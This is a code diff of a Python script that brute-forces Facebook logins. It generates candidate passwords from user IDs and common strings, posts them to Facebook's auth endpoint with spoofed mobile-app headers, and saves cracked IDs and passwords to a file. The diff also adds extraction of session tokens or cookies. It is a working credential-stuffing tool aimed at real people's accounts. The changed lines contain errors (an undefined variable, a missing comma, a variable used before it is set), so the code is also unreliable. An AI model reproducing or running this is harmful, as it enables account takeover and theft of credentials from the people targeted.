@@ -281,7 +281,7 @@ def rndm():
                 print(f'\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m\033[1;97m FIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE');linex()
                 for love in user:
                         ids = code + love 
-                        pasx = [ids,ids[6:],ids[8:],ids[:6],ids[:8],'57273200','57575751','59039200']
+                        pasx = [idf[:6],idf[:8],idf,'57273200','57575751','59039200','57575752']
                         pasa= [ids,ids[:8],ids[:6],ids[:7]]
                         pasb= ['57273200','57575751','59039200','57575752']
                         pasc= ['hindustan','india12345','india123']
@@ -401,7 +401,7 @@ def _M2_(ids,pasx):
 'client_country_code': 'GB',
 'fb_api_req_friendly_name': 'authenticate'}
                         head={
-    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; SM-G955F Build/PPR1.292777.533) [FBAN/FB4A; FBAV/255.0.0.14.126; FBPN/com.facebook.katana; FBLC/en_US; FBBV/202766316; FBCR/Movistar; FBMF/Samsung; FBBD/samsung; FBDV/202766316; FBSV/9.6.2; FBCA/arm64-v8a:nu 11; FBDM/{density=3.5,width=1440,height=2960}; FB_FW/1]',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G960N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4361.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;',
     'Accept-Encoding': 'gzip, deflate',
     'Accept': '*/*',
     'Connection': 'Keep-Alive',
@@ -421,10 +421,11 @@ def _M2_(ids,pasx):
     'X-FB-Server-Cluster': 'True',
     'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                         url1= 'https://graph.facebook.com/auth/login'
-                        BLACK=session.post(url1,data=data, headers=head).json()
-                        if 'session_key' in BLACK:
+                        BLACK=session.post(url1,data=data, headers=head allow_redirects = False, verify = True).json()
+                        if 'access_token' in BLACK:
                                 uid = BLACK["uid"]
-                                print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
+                                print(f'\r\r{G}[ATOM-OK]: {uid} | {ps} | {ckkk}')
+                                ckkk = ";".join(i["name"]+"="+i["value"] for i in BLACK["access_token"])
                                 open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'\n')
                                 ok.append(uid)
                                 break
